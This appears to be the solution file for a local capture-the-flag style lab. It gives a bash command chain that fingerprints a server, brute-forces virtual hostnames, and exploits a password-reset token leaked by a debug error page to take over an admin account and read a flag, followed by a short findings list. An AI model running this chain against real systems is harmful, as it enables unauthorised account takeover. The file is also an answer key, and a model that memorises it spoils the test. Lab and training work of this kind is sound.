# Solution — C00 (full chain)

```bash
U=https://127.0.0.1:18543

# 1. wall
curl -skI $U/ | grep -Ei 'HTTP/|server'          # 404, Microsoft-HTTPAPI/2.0

# 2. certificate
tlsx -u 127.0.0.1:18543 -san -cn -silent -json | jq '.subject_an'

# 3. hostname
for w in $(cat _shared/data/vhost-labels.txt); do
  [ "$(curl -sk -o /dev/null -w '%{http_code}' -H "Host: $w.corp.lab" $U/robots.txt)" = 200 ] && echo "$w.corp.lab"
done
# chatadmin.corp.lab

# 4. app
curl -sk -H 'Host: chatadmin.corp.lab' $U/chatadmin | grep -o 'Chat Admin'

# 5. backend
curl -sk -H 'Host: chatadmin.corp.lab' $U/chatadmin/assets/app.js | grep API_BASE
curl -skI -H 'Host: chat-api.corp.lab' $U/nope | grep -i server     # Microsoft-IIS/10.0

# 6. exploit
curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
  -d '{"email":"admin@corp.lab"}' -o /tmp/500.html -w '%{http_code}\n' $U/api/auth/password_reset
TOKEN=$(grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1 | cut -d= -f2)
curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" $U/api/auth/password_reset/confirm
JWT=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
  -d '{"email":"admin@corp.lab","password":"NewPass-Aa1!"}' $U/api/auth/login | jq -r .token)
curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $JWT" $U/api/chats | grep -o 'FLAG{[^}]*}'

# 7. keyword app on the same IP
curl -skI -H 'Host: portal' $U/ | grep -i 'x-app'      # X-App: portal
curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.' $U/   # 404 (normalisation gap)
```

Findings this chain supports, if written up:

1. **Password reset token disclosure → account takeover** (DEBUG=True + mail failure). Critical: the
   token is issued before delivery fails, and the technical page prints the drafted mail.
2. **Hidden vhost exposing an internal console** — impact only with the above; on its own it is
   attack-surface expansion.
3. **Keyword-routed app with no domain allowlist** — reportable only with the data/operation you
   reach; the dashboard requires a login, which is why C10 grades on a token, not a 200.

Each case lab isolates one of these; this lab is the sequence, with the decoys back in.
